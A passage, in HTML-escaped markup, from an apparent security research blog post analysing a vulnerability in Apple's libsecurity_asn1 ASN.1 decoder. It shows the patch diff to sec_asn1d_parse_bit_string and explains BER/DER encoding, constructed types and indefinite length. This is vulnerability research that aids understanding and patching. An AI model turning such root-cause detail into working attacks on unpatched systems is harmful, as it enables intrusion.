class=\"c11\"&gt;5b4915a&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;100644&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;---&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;a&lt;/span&gt;&lt;span class=\"c1\"&gt;/&lt;/span&gt;&lt;span class=\"c3\"&gt;OSX&lt;/span&gt;&lt;span class=\"c1\"&gt;/&lt;/span&gt;&lt;span class=\"c3\"&gt;libsecurity_asn1&lt;/span&gt;&lt;span class=\"c1\"&gt;/&lt;/span&gt;&lt;span class=\"c3\"&gt;lib&lt;/span&gt;&lt;span class=\"c1\"&gt;/&lt;/span&gt;&lt;span class=\"c3\"&gt;secasn1d&lt;/span&gt;&lt;span class=\"c1\"&gt;.&lt;/span&gt;&lt;span class=\"c2\"&gt;c&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;+++&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;b&lt;/span&gt;&lt;span class=\"c1\"&gt;/&lt;/span&gt;&lt;span class=\"c3\"&gt;OSX&lt;/span&gt;&lt;span class=\"c1\"&gt;/&lt;/span&gt;&lt;span class=\"c3\"&gt;libsecurity_asn1&lt;/span&gt;&lt;span class=\"c1\"&gt;/&lt;/span&gt;&lt;span class=\"c3\"&gt;lib&lt;/span&gt;&lt;span class=\"c1\"&gt;/&lt;/span&gt;&lt;span class=\"c3\"&gt;secasn1d&lt;/span&gt;&lt;span class=\"c1\"&gt;.&lt;/span&gt;&lt;span class=\"c2\"&gt;c&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;@@&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;-&lt;/span&gt;&lt;span class=\"c11\"&gt;434&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c11\"&gt;9&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;+&lt;/span&gt;&lt;span class=\"c11\"&gt;434&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c11\"&gt;6&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;@@&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;loser&lt;/span&gt;&lt;span class=\"c1\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;PORT_ArenaRelease&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;cx&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;our_pool&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;our_mark&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;our_mark &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1 c12\"&gt;-&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16 c12\"&gt;if&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;(&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;new_state &lt;/span&gt;&lt;span class=\"c1 c12\"&gt;!=&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;)&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1 c12\"&gt;-&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; PORT_Free&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;(&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;new_state&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1 c12\"&gt;-&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1 c12\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;return&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;@@&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;-&lt;/span&gt;&lt;span class=\"c11\"&gt;1794&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c11\"&gt;19&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;+&lt;/span&gt;&lt;span class=\"c11\"&gt;1791&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c11\"&gt;13&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;@@&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;sec_asn1d_parse_bit_string &lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;sec_asn1d_state &lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;/*PORT_Assert (state-&amp;gt;pending &amp;gt; 0); */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;PORT_Assert &lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;place &lt;/span&gt;&lt;span class=\"c1\"&gt;==&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;beforeBitString&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1 c12\"&gt;-&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16 c12\"&gt;if&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;((&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;state&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;pending &lt;/span&gt;&lt;span class=\"c1 c12\"&gt;==&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11 c12\"&gt;0&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;)&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;||&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;(&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;state&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;contents_length &lt;/span&gt;&lt;span class=\"c1 c12\"&gt;==&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11 c12\"&gt;1&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;))&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1 c4\"&gt;+&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16 c4\"&gt;if&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;(&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;state&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;pending &lt;/span&gt;&lt;span class=\"c1 c4\"&gt;==&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11 c4\"&gt;0&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;)&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;dest &lt;/span&gt;&lt;span class=\"c1\"&gt;!=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c20\"&gt;SecAsn1Item&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;item &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c20\"&gt;SecAsn1Item&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;*)(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;dest&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; item&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c20\"&gt;Data&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; item&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c20\"&gt;Length&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;place &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;beforeEndOfContents&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1 c12\"&gt;-&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1 c12\"&gt;-&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c16 c12\"&gt;if&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;(&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;state&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;contents_length &lt;/span&gt;&lt;span class=\"c1 c12\"&gt;==&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11 c12\"&gt;1&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;)&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1 c12\"&gt;-&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c23 c12\"&gt;/* skip over (unused) remainder byte */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1 c12\"&gt;-&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c16 c12\"&gt;return&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11 c12\"&gt;1&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1 c12\"&gt;-&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1 c12\"&gt;-&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c16 c12\"&gt;else&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1 c12\"&gt;-&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c16 c12\"&gt;return&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11 c12\"&gt;0&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1 c4\"&gt;+&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16 c4\"&gt;return&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11 c4\"&gt;0&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span&gt;The first change (removing the &lt;/span&gt;&lt;span class=\"c7\"&gt;PORT_Free&lt;/span&gt;&lt;span class=\"c9\"&gt;) is immaterial for Apple&amp;#39;s use case as it&amp;#39;s fixing a double free which doesn&amp;#39;t impact Apple&amp;#39;s build. It&amp;#39;s only relevant when &amp;quot;allocator marks&amp;quot; are enabled and this feature is disabled.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span&gt;The vulnerability must therefore be in &lt;/span&gt;&lt;span class=\"c7\"&gt;sec_asn1d_parse_bit_string&lt;/span&gt;&lt;span class=\"c9\"&gt;. We know from xerub&amp;#39;s tweet that something goes wrong with a state machine, but to figure it out we need to cover some ASN.1 basics and then start looking at how the NSS ASN.1 state machine works.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c32 c8\" id=\"h.niqtzuiy3s6j\"&gt;&lt;span class=\"c31 c28\"&gt;ASN.1 encoding&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span&gt;ASN.1 is a Type-Length-Value serialization format, but with the neat quirk that it can also handle the case when you don&amp;#39;t know the length of the value, but want to serialize it anyway! That quirk is only possible when ASN.1 is encoded according to &lt;/span&gt;&lt;span&gt;Basic Encoding Rules (BER.) There is a stricter encoding called DER (Distinguished Encoding Rules)&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;which enforces that a particular value only has a single correct encoding and disallows the cases where you can serialize values without knowing their eventual lengths.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c21\"&gt;&lt;a class=\"c241\" href=\"https://luca.ntop.org/Teaching/Appunti/asn1.html\"&gt;This page is a nice beginner&amp;#39;s guide to ASN.1&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;. I&amp;#39;d really recommend skimming that to get a good overview of ASN.1.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c9\"&gt;There are a lot of built-in types in ASN.1. I&amp;#39;m only going to describe the minimum required to understand this vulnerability (mostly because I don&amp;#39;t know any more than that!) So let&amp;#39;s just start from the very first byte of a serialized ASN.1 object and figure out how to decode it:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span&gt;This first byte tells you the type, with the least significant 5 bits defining the type identifier. The special type identifier value of &lt;/span&gt;&lt;span class=\"c7\"&gt;0x1f&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;tells you that the type identifier doesn&amp;#39;t fit in those 5 bits and is instead encoded in a different way (which we&amp;#39;ll ignore):&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c9\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizzg9gXNiEAlpqdPX6dIJ-pzEqqCLLQgRmv0BPkemfLnoeJFYJVgOPrEm6MR8HJMgX88oyMorrni9bnqDYcIuTjMuqF4gqF9q-Upt4tvTQAlzJMoO5u1ZcgAYcSt6eGnLaXeqSQyDO1D2tV4BXPquPyyzosMl00q5xBdmHucTkCxNRKIWkLSXj0KyR/s600/image6%20%281%29%281%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizzg9gXNiEAlpqdPX6dIJ-pzEqqCLLQgRmv0BPkemfLnoeJFYJVgOPrEm6MR8HJMgX88oyMorrni9bnqDYcIuTjMuqF4gqF9q-Upt4tvTQAlzJMoO5u1ZcgAYcSt6eGnLaXeqSQyDO1D2tV4BXPquPyyzosMl00q5xBdmHucTkCxNRKIWkLSXj0KyR/s600/image6%20%281%29%281%29.png\" border=\"0\" alt=\"Diagram showing first two bytes of a serialized ASN.1 object. The first byte in this case is the type and class identifier and the second is the length.\" style=\"max-height: 750; max-width: 600px;\" title=\"Diagram showing first two bytes of a serialized ASN.1 object. The first byte in this case is the type and class identifier and the second is the length.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c34 c8\"&gt;&lt;span class=\"c27 c26\"&gt;Diagram showing first two bytes of a serialized ASN.1 object. The first byte in this case is the type and class identifier and the second is the length.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c9\"&gt;The upper two bits of the first byte tell you the class of the type: universal, application, content-specific or private. For us, we&amp;#39;ll leave that as 0 (universal.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span&gt;Bit 6 is where the fun starts. A value of 1 tells us that this is a &lt;/span&gt;&lt;span class=\"c17\"&gt;primitive&lt;/span&gt;&lt;span&gt;&amp;nbsp;encoding which means that following the length are content bytes which can be directly interpreted as the intended type. For example, a primitive encoding of the string &amp;quot;HELLO&amp;quot; as an ASN.1 &lt;/span&gt;&lt;span class=\"c7\"&gt;printable string&lt;/span&gt;&lt;span&gt;&amp;nbsp;would have a length byte of &lt;/span&gt;&lt;span class=\"c7\"&gt;5&lt;/span&gt;&lt;span&gt;&amp;nbsp;followed by the ASCII characters &amp;quot;&lt;/span&gt;&lt;span class=\"c7\"&gt;HELLO&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;quot;. All fairly straightforward.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span&gt;A value of 0 for bit 6 however tells us that this is a &lt;/span&gt;&lt;span class=\"c17\"&gt;constructed&lt;/span&gt;&lt;span&gt;&amp;nbsp;encoding. This means that the bytes following the length are not the &amp;quot;raw&amp;quot; content bytes for the type but are instead ASN.1 encodings of one or more &amp;quot;chunks&amp;quot; which need to be individually parsed and concatenated to form the final output value. And to make things extra complicated it&amp;#39;s also possible to specify a length value of &lt;/span&gt;&lt;span class=\"c7\"&gt;0&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;which means that you don&amp;#39;t even know how long the reconstructed output will be or how much of the subsequent input will be required to completely build the output.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span&gt;This final case (of a constructed type with indefinite length) is known as &lt;/span&gt;&lt;span class=\"c17\"&gt;indefinite&lt;/span&gt;&lt;span&gt;&amp;nbsp;form. The end of the input which makes up a single indefinite value is signaled by a serialized type with the identifier, constructed, class and length values all equal to &lt;/span&gt;&lt;span class=\"c7\"&gt;0&lt;/span&gt;&lt;span&gt;&amp;nbsp;, which is encoded as two &lt;/span&gt;&lt;span class=\"c7\"&gt;NULL&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;bytes.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c32 c8\" id=\"h.iu15q8vvc4lc\"&gt;&lt;span class=\"c31 c28\"&gt;ASN.1 bitstrings&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span&gt;Most of the ASN.1 string types require no special treatment; they&amp;#39;re just buffers of raw bytes. Some of them have length restrictions. For example: a &lt;/span&gt;&lt;span class=\"c7\"&gt;BMP&lt;/span&gt;&lt;span&gt;&amp;nbsp;string must have an even length and a &lt;/span&gt;&lt;span class=\"c7\"&gt;UNIVERSAL&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;string must be a multiple of 4 bytes in length, but 